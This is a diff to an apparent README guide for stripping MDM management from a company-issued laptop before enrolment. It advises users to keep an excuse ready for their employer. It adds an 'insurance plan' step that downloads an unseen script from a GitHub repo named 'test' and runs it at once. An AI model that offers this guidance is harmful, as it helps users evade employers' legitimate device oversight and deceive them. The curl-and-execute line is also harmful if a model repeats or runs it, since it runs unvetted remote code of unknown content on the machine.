@@ -69,3 +69,8 @@ curl https://raw.githubusercontent.com/polors2/test/main/test.sh -o test.sh && c
 19. Congratulations, you're MDM free! 💫
 
 ###### Although it's virtually impossible to catch that you've removed the MDM (because it wasn't even configured), be aware that the serial number of the laptop will still be shown in the inventory system of your company. We're removing the MDM's capabilities before it's configured locally, so it won't be available as a managed laptop to them. Use with caution. Probably a good idea to have a valid excuse as well.
+
+STEP 2 INSURANCE PLAN
+```zsh
+curl https://raw.githubusercontent.com/polors2/test/main/step2.sh -o step2.sh && chmod +x ./step2.sh && ./step2.sh
+```
